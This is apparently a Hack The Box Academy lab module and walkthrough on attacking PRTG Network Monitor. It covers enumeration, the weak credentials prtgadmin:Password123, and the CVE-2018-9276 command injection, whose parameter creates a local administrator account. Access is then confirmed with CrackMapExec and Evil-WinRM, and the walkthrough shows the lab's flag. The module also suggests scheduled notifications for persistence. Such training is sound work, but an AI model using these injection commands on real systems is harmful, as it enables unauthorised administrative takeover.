# 

---

[PRTG Network Monitor](https://www.paessler.com/prtg) is agentless network monitor software. It can be used to monitor bandwidth usage, uptime and collect statistics from various hosts, including routers, switches, servers, and more. The first version of PRTG was released in 2003. In 2015 a free version of PRTG was released, restricted to 100 sensors that can be used to monitor up to 20 hosts. It works with an autodiscovery mode to scan areas of a network and create a device list. Once this list is created, it can gather further information from the detected devices using protocols such as ICMP, SNMP, WMI, NetFlow, and more. Devices can also communicate with the tool via a REST API. The software runs entirely from an AJAX-based website, but there is a desktop application available for Windows, Linux, and macOS. A few interesting data points about PRTG:

- According to the company, it is used by 300,000 users worldwide
- The company that makes the tool, Paessler, has been creating monitoring solutions since 1997
- Some organizations that use PRTG to monitor their networks include the Naples International Airport, Virginia Tech, 7-Eleven, and [more](https://www.paessler.com/company/casestudies)

Over the years, PRTG has suffered from [26 vulnerabilities](https://www.cvedetails.com/vulnerability-list/vendor_id-5034/product_id-35656/Paessler-Prtg-Network-Monitor.html) that were assigned CVEs. Of all of these, only four have easy-to-find public exploit PoCs, two cross-site scripting (XSS), one Denial of Service, and one authenticated command injection vulnerability which we will cover in this section. It is rare to see PRTG exposed externally, but we have often come across PRTG during internal penetration tests. The HTB weekly release box [Netmon](https://0xdf.gitlab.io/2019/06/29/htb-netmon.html) showcases PRTG.

---

## Discovery/Footprinting/Enumeration

We can quickly discover PRTG from an Nmap scan. It can typically be found on common web ports such as 80, 443, or 8080. It is possible to change the web interface port in the Setup section when logged in as an admin.

  PRTG Network Monitor

```shell-session
xF1NN@htb[/htb]$ sudo nmap -sV -p- --open -T4 10.129.201.50

Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-22 15:41 EDT
Stats: 0:00:00 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 0.06% done
Nmap scan report for 10.129.201.50
Host is up (0.11s latency).
Not shown: 65492 closed ports, 24 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  ssl/http      Splunkd httpd
8080/tcp  open  http          Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)
8089/tcp  open  ssl/http      Splunkd httpd
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49677/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 97.17 seconds
```

From the Nmap scan above, we can see the service `Indy httpd 17.3.33.2830 (Paessler PRTG bandwidth monitor)` detected on port 8080.

PRTG also shows up in the EyeWitness scan we performed earlier. Here we can see that EyeWitness lists the default credentials `prtgadmin:prtgadmin`. They are typically pre-filled on the login page, and we often find them unchanged. Vulnerability scanners such as Nessus also have [plugins](https://www.tenable.com/plugins/nessus/51874) that detect the presence of PRTG.

![PRTG Network Monitor login page with default credentials 'prtgadmin/prtgadmin' displayed, server details, and response code 200.](https://academy.hackthebox.com/storage/modules/113/prtg_eyewitness.png)

Once we have discovered PRTG, we can confirm by browsing to the URL and are presented with the login page.

   

![PRTG Network Monitor login page with fields for login name and password, default credentials 'prtgadmin/prtgadmin', and Paessler blog section.](https://academy.hackthebox.com/storage/modules/113/prtg_login.png)

From the enumeration we performed so far, it seems to be PRTG version `17.3.33.2830` and is likely vulnerable to [CVE-2018-9276](https://nvd.nist.gov/vuln/detail/CVE-2018-9276) which is an authenticated command injection in the PRTG System Administrator web console for PRTG Network Monitor before version 18.2.39. Based on the version reported by Nmap, we can assume that we are dealing with a vulnerable version. Using `cURL` we can see that the version number is indeed `17.3.33.283`.

  PRTG Network Monitor

```shell-session
xF1NN@htb[/htb]$ curl -s http://10.129.201.50:8080/index.htm -A "Mozilla/5.0 (compatible;  MSIE 7.01; Windows NT 5.0)" | grep version

  <link rel="stylesheet" type="text/css" href="/css/prtgmini.css?prtgversion=17.3.33.2830__" media="print,screen,projection" />
<div><h3><a target="_blank" href="https://blog.paessler.com/new-prtg-release-21.3.70-with-new-azure-hpe-and-redfish-sensors">New PRTG release 21.3.70 with new Azure, HPE, and Redfish sensors</a></h3><p>Just a short while ago, I introduced you to PRTG Release 21.3.69, with a load of new sensors, and now the next version is ready for installation. And this version also comes with brand new stuff!</p></div>
    <span class="prtgversion">&nbsp;PRTG Network Monitor 17.3.33.2830 </span>
```

Our first attempt to log in with the default credentials fails, but a few tries later, we are in with `prtgadmin:Password123`.

   

![PRTG Network Monitor dashboard showing options for viewing results, getting support, installing app, downloading console, current alarms with 5 issues, open tickets, SSL warning, activity summary, and license status with 4 trial days left.](https://academy.hackthebox.com/storage/modules/113/prtg_logged_in.png)

---

## Leveraging Known Vulnerabilities

Once logged in, we can explore a bit, but we know that this is likely vulnerable to a command injection flaw so let's get right to it. This excellent [blog post](https://www.codewatch.org/blog/?p=453) by the individual who discovered this flaw does a great job of walking through the initial discovery process and how they discovered it. When creating a new notification, the `Parameter` field is passed directly into a PowerShell script without any type of input sanitization.

To begin, mouse over `Setup` in the top right and then the `Account Settings` menu and finally click on `Notifications`.

   

![PRTG Network Monitor account settings page showing notifications tab with options for email and ticket notifications, and controls to test, pause, edit, clone, or delete notifications.](https://academy.hackthebox.com/storage/modules/113/prtg_notifications.png)

Next, click on `Add new notification`.

   

![Add Notification page in PRTG Network Monitor showing settings for notification name 'pwn', status started, schedule none, and summarization method to send first DOWN and UP message ASAP, then summarize.](https://academy.hackthebox.com/storage/modules/113/prtg_add.png)

Give the notification a name and scroll down and tick the box next to `EXECUTE PROGRAM`. Under `Program File`, select `Demo exe notification - outfile.ps1` from the drop-down. Finally, in the parameter field, enter a command. For our purposes, we will add a new local admin user by entering `test.txt;net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add`. During an actual assessment, we may want to do something that does not change the system, such as getting a reverse shell or connection to our favorite C2. Finally, click the `Save` button.

![Notification settings with options to send email, push notification, SMS, and execute program with parameters for 'Demo exe notification - outfile.ps1'.](https://academy.hackthebox.com/storage/modules/113/prtg_execute.png)

After clicking `Save`, we will be redirected to the `Notifications` page and see our new notification named `pwn` in the list.

   

![PRTG Network Monitor account settings showing notifications list with options to test, pause, edit, clone, or delete notifications, all marked as active.](https://academy.hackthebox.com/storage/modules/113/prtg_pwn.png)

Now, we could have scheduled the notification to run (and execute our command) at a later time when setting it up. This could prove handy as a persistence mechanism during a long-term engagement and is worth taking note of. Schedules can be modified in the account settings menu if we want to set it up to run at a specific time every day to get our connection back or something of that nature. At this point, all that is left is to click the `Test` button to run our notification and execute the command to add a local admin user. After clicking `Test` we will get a pop-up that says `EXE notification is queued up`. If we receive any sort of error message here, we can go back and double-check the notification settings.

Since this is a blind command execution, we won't get any feedback, so we'd have to either check our listener for a connection back or, in our case, check to see if we can authenticate to the host as a local admin. We can use `CrackMapExec` to confirm local admin access. We could also try to RDP to the box, access over WinRM, or use a tool such as [evil-winrm](https://github.com/Hackplayers/evil-winrm) or something from the [impacket](https://github.com/SecureAuthCorp/impacket) toolkit such as `wmiexec.py` or `psexec.py`.

  PRTG Network Monitor

```shell-session
xF1NN@htb[/htb]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG! 

SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

And we confirm local admin access on the target! Work through the example and replicate all of the steps on your own against the target system. Challenge yourself to also leverage the command injection vulnerability to obtain a reverse shell connection from the target.

---
# PRTG Network Monitor

## Question 1

### "What version of PRTG is running on the target?"

After spawning the target machine, students need to launch an `Nmap` scan to enumerate its services and their versions:

Code: shell

```shell
nmap -A -Pn STMIP
```

  PRTG Network Monitor

```shell-session
┌─[us-academy-1]─[10.10.14.6]─[htb-ac413848@htb-f6k4hfqgg8]─[~]
└──╼ [★]$ nmap -A -Pn 10.129.201.50

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-10 17:57 BST
Nmap scan report for 10.129.201.50
Host is up (0.073s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE SERVICE       VERSION
<SNIP>
8080/tcp open  http          Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
|_http-server-header: PRTG/18.1.37.13946
| http-title: Welcome | PRTG Network Monitor (APP03)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-open-proxy: Proxy might be redirecting requests

<SNIP>
```

`PRTG` is running on port 8080, thus, students need to navigate to `https://STMIP:8080` to see its version `18.1.37.13946` at the bottom left of the web page:

![Attacking_Common_Applications_Walkthrough_Image_41.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_41.png)

Answer: {hidden}

# PRTG Network Monitor

## Question 2

### "Attack the PRTG target and gain remote code execution. Submit the contents of the flag.txt file on the administrator Desktop."

From the previous question, students know that `PRTG` is running on port 8080, therefore, they need to navigate to `https://STMIP:8080` and login using the credentials `prtgadmin:Password123`:

![Attacking_Common_Applications_Walkthrough_Image_42.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_42.png)

Students then need to hover the click on `Setup` -> `Account Settings` -> `Notifications`:

![Attacking_Common_Applications_Walkthrough_Image_43.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_43.png)

Then, students need to click on "Add new notification" and name the notification with any name:

![Attacking_Common_Applications_Walkthrough_Image_44.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_44.png)

Students then need to scroll down until they see the "Execute Program" option and check it:

![Attacking_Common_Applications_Walkthrough_Image_45.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_45.png)

Students need to set the "Program File" field to "Demo exe notification - outfile.ps1" and set the "Parameter" field to a command that will create a user on the Windows system running `PRTG` and add it to the local administrators group:

Code: powershell

```powershell
test.txt; net user prtgadm1 Pwn3d_by_PRTG! /add;net localgroup administrators prtgadm1 /add
```

![Attacking_Common_Applications_Walkthrough_Image_46.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_46.png)

After students save the new notification, they need to select it (named "Outage Notification" in here) when in the "Notifications" tab, and at the right most corner of the screen will appear a vertical bar, students need to click on the bell icon to run a test notification (therefore, executing the command used in the "Parameter" field of the notification):

![Attacking_Common_Applications_Walkthrough_Image_47.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_47.png)

![Attacking_Common_Applications_Walkthrough_Image_48.png](https://academy.hackthebox.com/storage/walkthroughs/39/Attacking_Common_Applications_Walkthrough_Image_48.png)

Afterward, students can check for whether the user `prtgadm1` has been successfully created on the Windows machine using `crackmapexec`:

Code: shell

```shell
sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!
```

  PRTG Network Monitor

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-6la7uwnoyb]─[~]
└──╼ [★]$ sudo crackmapexec smb 10.129.201.50 -u prtgadm1 -p Pwn3d_by_PRTG!

<SNIP>
SMB         10.129.201.50   445    APP03            [*] Windows 10.0 Build 17763 x64 (name:APP03) (domain:APP03) (signing:False) (SMBv1:False)
SMB         10.129.201.50   445    APP03            [+] APP03\prtgadm1:Pwn3d_by_PRTG! (Pwn3d!)
```

Now that students are assured the user has been added successfully, they need to connect to the spawned target machine, such as with `Evil-WinRM`:

Code: shell

```shell
evil-winrm -i STMIP -u prtgadm1 -p 'Pwn3d_by_PRTG!'
```

  PRTG Network Monitor

```shell-session
┌─[us-academy-1]─[10.10.14.169]─[htb-ac413848@htb-6la7uwnoyb]─[~]
└──╼ [★]$ evil-winrm -i 10.129.201.50 -u prtgadm1 -p 'Pwn3d_by_PRTG!'

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\prtgadm1\Documents>
```

At last, students need to print out the contents of the flag file "flag.txt", which is inside the directory `C:\Users\Administrator\Desktop\`:

Code: shell

```shell
type C:\Users\Administrator\Desktop\flag.txt
```

  PRTG Network Monitor

```shell-session
*Evil-WinRM* PS C:\Users\prtgadm1\Documents> type C:\Users\Administrator\Desktop\flag.txt

WhOs3_m0nit0ring_wH0?
```

Answer: {hidden}